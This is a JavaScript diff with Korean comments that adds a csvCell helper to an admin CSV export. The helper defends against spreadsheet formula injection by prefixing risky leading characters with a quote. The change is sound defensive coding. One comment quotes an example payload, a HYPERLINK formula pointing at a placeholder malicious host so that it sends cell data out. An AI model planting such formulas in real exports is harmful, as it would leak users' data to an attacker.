@@ -143,16 +143,34 @@ function matchText(hay, q) {
     return true;
 }
 
+/* ── CSV 셀 한 칸 — 수식 주입 방어 + 따옴표 처리 (A-201 / CWE-1236) ─────────
+   엑셀·구글 시트는 `=` `+` `-` `@` 로 시작하는 셀을 **수식으로 실행**한다.
+   `=HYPERLINK("http://악성/"&A1)` 처럼 쓰면 담당자가 CSV 를 여는 순간
+   내보낸 데이터가 외부로 나갈 수 있다. 가입·신청 폼은 누구나 통과하므로
+   이름·회사명·프로젝트명은 공격자가 고르는 값으로 봐야 한다.
+
+   방어: 앞에 작은따옴표를 붙인다. 엑셀·시트는 그 따옴표를 '이건 글자'
+   표시로 읽고 화면에 보여주지 않으므로, 사람이 읽는 내용은 그대로다.
+   탭(0x09)·CR(0x0D) 도 같은 취급을 받으므로 함께 막는다.
+
+   `-` 때문에 음수가 글자로 바뀐다. 이 내보내기들은 연락처·회사명 표라
+   계산할 숫자가 없어 그 대가를 받아들였다. 숫자를 내보내는 CSV 가
+   생기면 그 열만 예외로 두는 게 아니라 **열 종류를 받는 인자**를 더해야
+   한다 — 값만 보고는 의도를 알 수 없기 때문이다.
+   ──────────────────────────────────────────────────────────────────── */
+function csvCell(value) {
+    var s = String(value == null ? '' : value);
+    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;                                   // 수식으로 읽히지 않게
+    if (s.indexOf(',') !== -1 || s.indexOf('"') !== -1 || s.indexOf('\n') !== -1) s = '"' + s.replace(/"/g, '""') + '"';
+    return s;
+}
+
 // ── CSV 내려받기 — admin/newsletter-subscribers.html 의 downloadCSV 를 일반화해 올린 것 (6단계, view-users.js 가 쓴다) ──
 //    rows = [[셀, …], …] (첫 행이 머리글). 쉼표·따옴표·줄바꿈은 따옴표로 감싼다. UTF-8 BOM(엑셀). 토스트는 호출자가.
 //    ★ 뉴스레터·디지털 알림 페이지는 자기 downloadCSV()(인자 없음) 를 계속 쓴다 — 뒤 `function` 선언이 이긴다.
 function downloadCSV(rows, filename) {
     var csv = (rows || []).map(function (r) {
-        return (r || []).map(function (cell) {
-            var s = String(cell == null ? '' : cell);
-            if (s.indexOf(',') !== -1 || s.indexOf('"') !== -1 || s.indexOf('\n') !== -1) s = '"' + s.replace(/"/g, '""') + '"';
-            return s;
-        }).join(',');
+        return (r || []).map(csvCell).join(',');   // A-201 — 수식 주입 방어는 csvCell 한 곳에서
     }).join('\n');
     var blob = new Blob(['\uFEFF' + csv], { type: 'text/csv;charset=utf-8;' });
     var url = URL.createObjectURL(blob);
